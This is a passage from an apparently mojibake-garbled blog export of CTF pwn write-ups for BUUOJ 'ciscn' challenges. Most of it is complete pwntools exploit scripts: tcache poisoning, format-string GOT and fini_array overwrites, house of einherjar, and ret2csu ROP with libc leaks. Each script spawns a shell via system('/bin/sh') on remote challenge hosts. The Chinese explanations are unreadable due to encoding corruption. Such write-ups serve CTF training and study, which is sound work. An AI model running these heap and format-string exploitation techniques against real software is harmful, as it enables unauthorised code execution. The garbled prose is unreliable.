†å—é‡å ï¼Œæœ‰äº†å †å—é‡å åŠ ä¸ŠeditåŠŸèƒ½å°±å¾ˆéšæ„äº†ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_5\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28635\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"your choice: \"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index: \", str(idx))\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \", con)\n\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nfree_got = elf.got['free']\n__stack_chk_fail_got = elf.got['__stack_chk_fail']\n\nadd(16,0x10,p64(0x0)+p64(0x210))\nadd(1,0x10,p64(free_got))\nadd(2,0x20,p64(free_got))\nadd(3,0x30,p64(free_got))\nadd(4,0x40,p64(free_got))\n\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\n\nadd(5,0x200,p64(0x0)+p64(0x21)+p64(free_got))\nadd(6,0x10,\"Free\")\nadd(7,0x10,p64(puts_plt))\n\nedit(5,p64(0x0)+p64(0x21)+\np64(0x0)*0x3+p64(0x31)+\np64(__stack_chk_fail_got))\nadd(8,0x20,p64(__stack_chk_fail_got))\nadd(9,0x20,\"a\")\ndelete(9)\n\nlibc_base = u64(rc(6).ljust(8, '\\x00'))-libc.sym['puts']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym['system']\n\nedit(5,p64(0x0)+p64(0x21)+p64(0x0)*10+p64(free_got))\nadd(10,0x30,p64(free_got))\nadd(11,0x30,p64(system_addr))\nadd(12,0x60,\"/bin/sh\\x00\")\ndelete(12)\np.interactive()\n```\n\nè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼Œæˆ‘çš„åšæ³•ä¸åƒå…¶ä»–äººç”³è¯·chunkåˆ°chunkListç›´æ¥æ§åˆ¶chunkå—ï¼Œä»è€Œä¿®æ”¹å †å—åœ°å€ä¼ å…¥åˆ°è¢«åŠ«æŒä¸ºputså‡½æ•°çš„free_gotæ¥æ³„éœ²åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥ç”³è¯·åˆ°gotè¡¨ä¸Šï¼Œå°†gotè¡¨ä½œä¸ºå †åœ°å€ä¼ å…¥è¢«åŠ«æŒä¸ºputså‡½æ•°çš„free_gotæ¥æ³„éœ²gotè¡¨ä¸­çš„åœ°å€ã€‚\n\nä½†æ˜¯è¿™é‡Œä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯é€‰æ‹©å“ªä¸€ä¸ªå‡½æ•°çš„gotè¡¨ä½œä¸ºå †åœ°å€ã€‚è¿™é‡Œä¸¤ç§è§£å†³åŠæ³•ï¼š\n\n(1)å¯ä»¥å‘é€sizeä¸º0ï¼Œé‚£ä¹ˆå°±ä¸ä¼šä¿®æ”¹åˆ°å‡½æ•°çš„gotè¡¨ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¦æ±‚åˆ©ç”¨0x20çš„tcacheçš„dupã€‚\n\n(2)å¦‚æœsizeä¸ä¸º0ï¼Œé‚£ä¹ˆç”³è¯·å †å—çš„æ—¶å€™åŠ¿å¿…è¦å‘é€æ•°æ®ï¼Œæœ€å°‘ä¹Ÿæ˜¯\\x0aã€‚é‚£ä¹ˆå‘é€æ•°æ®ä¹Ÿè‚¯å®šä¼šä¿®æ”¹åˆ°è¯¥å‡½æ•°çš„çœŸå®åœ°å€ï¼Œé‚£ä¹ˆæ³„éœ²å‡ºæ¥çš„å°±æ˜¯ä¿®æ”¹åçš„çœŸå®åœ°å€ï¼Œè€Œä¸”å¦‚æœè¯¥å‡½æ•°åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­å®¹æ˜“è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆä¿®æ”¹ä¹‹åä¹ŸåŠ¿å¿…ä¼šä½¿å¾—ç¨‹åºå´©æºƒã€‚è¿™é‡Œæœ‰Libcæ–‡ä»¶è¿˜å¥½ï¼Œå¯ä»¥ç›´æ¥æŸ¥æ‰¾libcæ–‡ä»¶å¯¹äºå‡½æ•°çš„æœ€åä¸€ä¸ªå­—èŠ‚æ¥ä¿®å¤ä¸€ä¸‹ï¼Œä½†å¦‚æœæ²¡æœ‰libcæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ²¡æ‹›äº†ã€‚\n\nè¿™é‡Œå‡è®¾æ²¡æœ‰libcæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾ä¸€ä¸ªä¸å¤ªèƒ½ç”¨åˆ°å‡½æ•°æ¥ä¿®æ”¹ï¼Œè¿™é‡Œåˆšå¥½æœ‰ä¸ª__stack_chk_fail_ï¼Œåªè¦ä¸è§¦å‘canaryï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸ä¼šè¢«è°ƒç”¨ï¼Œå…¶gotè¡¨æ˜¯å»¶è¿Ÿç»‘å®šçš„ï¼Œä¿å­˜çš„ä¸æ˜¯çœŸå®åœ°å€ï¼Œç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œã€‚åŒæ—¶è¿˜è¦æ³¨æ„çš„æ˜¯ç”±äºæ˜¯__stack_chk_fail_çš„gotè¡¨ä½œä¸ºå †åœ°å€ï¼Œä½†æ˜¯å®é™…ä¼ å…¥ç»™putså‡½æ•°çš„åœ°å€æ˜¯__stack_chk_fail_got-0x10ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ¥çš„æ˜¯å¯¹åº”çš„putså‡½æ•°çš„çœŸå®åœ°å€ã€‚\n\nä¹‹åå°±æ­£å¸¸åˆ©ç”¨0x20,0x30,0x40çš„tcacheæ¥ä»»æ„ç”³è¯·ä¿®æ”¹äº†ã€‚\n\n2.ciscn_2019_en_3ï¼šæ°´é¢˜ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œæ‰“free_hookï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ç¨‹åºæœ¬èº«çš„æç¤ºä¿¡æ¯ï¼Œæ³¨æ„ç©ºæ ¼å’ŒDEBUGçš„ä½¿ç”¨ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_en_3\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"25412\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Input your choice:\"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"Please input the size of story: \\n\", str(size))\n    sa(\"please inpute the story: \\n\", con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n\nsla(\"Please input the index:\\n\", str(idx))\nsla(\"What's your name?\\n\",\"%p.%p\")\nru(\".0x\")\nread_addr = int(rc(12),16)-0x11\nobj = LibcSearcher(\"read\", read_addr)\nlibc_base = read_addr-obj.dump('read')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nfree_hook = libc_base + obj.dump('__free_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nsla(\"Please input your ID.\\n\",\"A\")\nadd(0x18,p64(free_hook))\nadd(0x18,\"/bin/sh\\x00\")\ndelete(0)\ndelete(0)\nadd(0x18,p64(free_hook))\nadd(0x18,p64(free_hook))\nadd(0x18,p64(system_addr))\ndelete(1)\np.interactive()\n```\n\n3.ciscn_2019_s_6ï¼šæ°´åˆ°å®¶çš„é¢˜ï¼Œæ‡’å¾—çœ‹ï¼Œä¸¤åˆ†é’Ÿæ”¹å®Œè„šæœ¬æ‹‰å€’ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_6\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\np = process(binary)\n#p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"25301\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size,name,call):\n    p.recvuntil('choice:')\n    p.sendline('1')\n    p.recvuntil('name')\n    p.sendline(str(size))\n    p.recvuntil('name:')\n    p.sendline(name)\n    p.recvuntil('call:')\n    p.sendline(call)\n\ndef show(idx):\n    p.recvuntil('choice:')\n    p.sendline('2')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\ndef delete(idx):\n    p.recvuntil('choice:')\n    p.sendline('3')\n    p.recvuntil('index:')\n    p.sendline(str(idx))\n\nadd(0x88,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,'pppp','pppp')\nfor i in range(7):\n    delete(0)\n\ndelete(0)\nshow(0)\np.recvuntil('name')\nmain_arena=u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))-96\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nfree_hook = libc_base + obj.dump(\"__free_hook\")\nsystem_addr = libc_base + obj.dump(\"system\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\n#p.recvuntil()\ndelete(1)\ndelete(1)\ndelete(1)\n\nadd(0x20,p64(free_hook),'pppp')\nadd(0x20,'pppp','pppp')\nadd(0x20,p64(system_addr),'pppp')\nadd(0x20,'/bin/sh\\x00','pppp')\n\ndelete(6)\np.interactive()\n```\n\n4.ciscn_2019_sw_1ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ”¹fini_arrayä¸ºmain_addrï¼Œä½¿å¾—ç¨‹åºå¾ªç¯å†æ¥ä¸€æ¬¡ï¼ŒåŠ«æŒprintfä¸ºsystem_pltï¼Œå†è¾“å…¥binshå³å¯getshellã€‚ç¨‹åºé‡Œçš„sysæ²¡å•¥ç”¨ï¼Œç”¨æ¥è¿·æƒ‘äººçš„ï¼Œå› ä¸ºcommandæ— æ³•è¢«ä¿®æ”¹ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_2019_sw_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27341\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nfini_array = 0x0804979C\nprintf_got = elf.got['printf']\nsystem_plt = elf.plt['system']\nmain_addr = elf.sym['main']\n\n\npayload = \"\"\npayload += p32(fini_array+2)\npayload += p32(fini_array)\npayload += p32(printf_got+2)\npayload += p32(printf_got)\npayload += '%'+str(0x0804-0x10)+'c'+'%4$hn'\npayload += '%'+str(int(main_addr&0xffff)-0x0804)+'c'+'%5$hn'\npayload += '%'+str(0x10804-int(main_addr&0xffff))+'c'+'%6$hn'\npayload += '%'+str(int(system_plt&0xffff)+0x10000-0x10804)+'c'+'%7$hn'\n\n\npause()\np.sendline(payload)\npause()\np.sendline(\"/bin/sh\\x00\")\npause()\np.interactive()\n```\n\n5.ciscn_2019_s_1ï¼šå·®ç‚¹è¢«è¿™é“é¢˜æå´©æºƒã€‚ç½‘ä¸Šè§£æ³•å¤ªå¤šï¼Œæ„Ÿè§‰éƒ½æŒºéº»çƒ¦çš„ã€‚å…¶å®ç›´æ¥ä¸€ä¸ªæŠ€å·§å°±æå®šï¼šhouse_of_einherjarã€‚è¿›è¡Œä¸€å®šå †å¸ƒå±€ï¼Œç”³è¯·chunk8-chunk10ï¼Œå°†0x100çš„tcacheå¡«æ»¡ï¼Œåœ¨chunk8ä¸­ä¼ªé€ chunkï¼Œæ»¡è¶³2.27ä¸‹çš„unlinkè¦æ±‚ï¼Œå³sizeä½å’Œfd,bkä½ã€‚(ç”±äºè¿™é‡Œç»™äº†å †åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨ï¼Œæ°å¥½èƒ½å¤Ÿæ»¡è¶³è¦æ±‚)ä¹‹åè§¦å‘0x100çš„off-by-nullå‘ä¸Šåˆå¹¶ï¼Œå°†chunk9ç»™overlapï¼Œä¹‹åç”³è¯·åˆ°tcacheç»“æ„ä½“ï¼Œå°±èƒ½éšä¾¿ç©äº†ã€‚(house_of_einherjaré‡ç‚¹åœ¨äº2.27ä¸‹çš„unlink)\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_s_1\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\np = process(binary)\n#p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\nelf = ELF(binary)\n#libc = ELF(libc_file)\nelse:\np = remote(\"node3.buuoj.cn\",\"26685\")\nelf = ELF(binary)\n#libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"4.show\\n\"\n\n\ndef add(idx,size, con):\n    sla(menu, \"1\")\n    sla(\"index:\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    ru(\"gift: \")\n    chunk_addr = int(ru(\"\\n\"),16)\n    sa(\"content:\\n\", con)\n    return chunk_addr\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"4\")\n    sla(\"index:\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n    sa(\"content:\\n\", con)\n\nkey_addr = 0x6022B8\n\nchunk0_addr = add(0,0xf8,\"0\")\nheap_base = chunk0_addr-0x260\n\nchunk8_addr = add(8,0xf8,\"8\")\nchunk9_addr = add(9,0xe8,\"9\")\nchunk10_addr = add(10,0xf8,\"10\")\nlog.info(\"chunk8_addr:0x%x\"%chunk8_addr)\nlog.info(\"chunk9_addr:0x%x\"%chunk9_addr)\nlog.info(\"chunk10_addr:0x%x\"%chunk10_addr)\n\nedit(8,p64(0x110)+p64(0xf1+0xf0)+\np64(chunk8_addr)+p64(chunk8_addr))\nedit(9,\"9\"*0xe0+\np64(0xf0+0xf0))\n\nfor i in range(0,7):\n    add(i+1,0xf8,\"X\"*0xf7)\nfor i in range(0,7):\n    delete(i+1)\n\ndelete(9)\ndelete(10)\nchunkA_addr = add(9,0xd0,\"9\")\nchunkB_addr = add(10,0xd0,\np64(0x0)+p64(0xf0)+\np64(heap_base+0x10)+p64(heap_base+0x10))\nunsortedbin_addr = chunk8_addr+0x10+0xe0+0xe0\n\nadd(11,0xe8,p64(heap_base+0x10))\nadd(12,0xe8,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(0x0)+ #0xa0\np64(unsortedbin_addr-0x10)+ #0xb0\np64(heap_base+0x10)) #0xc0\n\nadd(13,0x88,p64(0x1))\nadd(14,0xa0,\"A\"*0x10)\nshow(14)\nru(\"AAAAAAAAAAAAAAAA\")\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\") #system\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\n\nedit(12,\"\\x00\"*0x40+p64(0x0)*7+\np64(key_addr)+ #0x90\np64(free_hook_addr)+ #0xa0\np64(unsortedbin_addr-0x10)) #0xc0\n\nadd(15,0x98,p64(system_addr))\nadd(16,0xf0,\"/bin/sh\\x00\")\n\ndelete(16)\np.interactive()\n```\n\n \n","tags":["åˆ·é¢˜"],"categories":["PWN"]},{"title":"CISCN-BUUåˆ·é¢˜è®°å½•1","url":"/2021/08/14/CISCN-BUUåˆ·é¢˜è®°å½•1/","content":"\n1.ciscn_2019_c_1ï¼šæ ˆæº¢å‡ºï¼Œè°ƒç”¨æ‰“å°å‡½æ•°æ³„éœ²åœ°å€ï¼Œä¸‡èƒ½gadgetï¼ŒROPã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./ciscn_2019_c_1\"\n#libc.so = \"./libc-2.24.so\"\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nrl = lambda :io.recvline()\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n'''\n#malloc_hook,main_aren Find\npython2 LibcOffset.py libc-2.23.so\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"28337\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\nmenu = \"choice!\\n\"\npop_rdi=0x400c83\nret=0x4006b9\nmain=elf.sym['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nencrypt_addr = 0x4009A0\n\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\nlog.info(\"u_gadget1:0x%x\"%u_gadget1)\nlog.info(\"u_gadget2:0x%x\"%u_gadget2)\n\npayload = \"\"\npayload += \"\\x00\"\npayload = payload.ljust(0x58,'A')\npayload += p64(u_gadget1) #ä½¿ç”¨ä¸‡èƒ½gadgetsè°ƒç”¨putsæ³„éœ²åœ°å€\npayload += p64(0x0)\npayload += p64(0x1) #rbpï¼Œéšä¾¿è®¾ç½®\npayload += p64(puts_got)\npayload += p64(0x8)\npayload += p64(puts_got) #ä»è¯¥gotè¡¨æ³„éœ²åœ°å€\npayload += p64(puts_got)\npayload += p64(u_gadget2)\npayload += 'A'*0x38 #æ ˆä¿®æ­£\npayload += p64(encrypt_addr)\n#è¿”å›åˆ°functionå¤„ï¼Œé€šå¸¸è¿”å›ç¨‹åºæœ€å¼€å§‹æ¥é‡æ–°è¿è¡Œç¨‹åºå¥½å†è¿›è¡Œå¸ƒç½®\n\n#payload='\\0'+'a'*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\n\nru(menu)\nsl('1')\nsl(payload)\nru('Ciphertext\\n')\nru('\\n')\nputs_addr = u64(rc(6).ljust(8,'\\x00'))\nlog.info(\"puts:0x%x\"%u_gadget2)\n\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr - obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"binsh_addr:0x%x\"%binsh_addr)\n\n\npayload='\\x00'+'a'*(0x50-1+8)+ p64(ret) + p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)\n\nsl(payload)\np.interactive()\n```\n\n2.ciscn_2019_es_2ï¼š32ä½æ ˆæº¢å‡ºï¼Œæº¢å‡ºé•¿åº¦ä¸å¤Ÿã€‚æ³„éœ²æ ˆåœ°å€ï¼Œç”¨ebpå°†æ ˆè¿ç§»åˆ°ä¸Šå±‚å‡½æ•°çš„æ ˆä¸­ï¼Œåˆ©ç”¨ä¸Šå±‚å‡½æ•°ä½™ä¸‹çš„æ±‡ç¼–ä»£ç 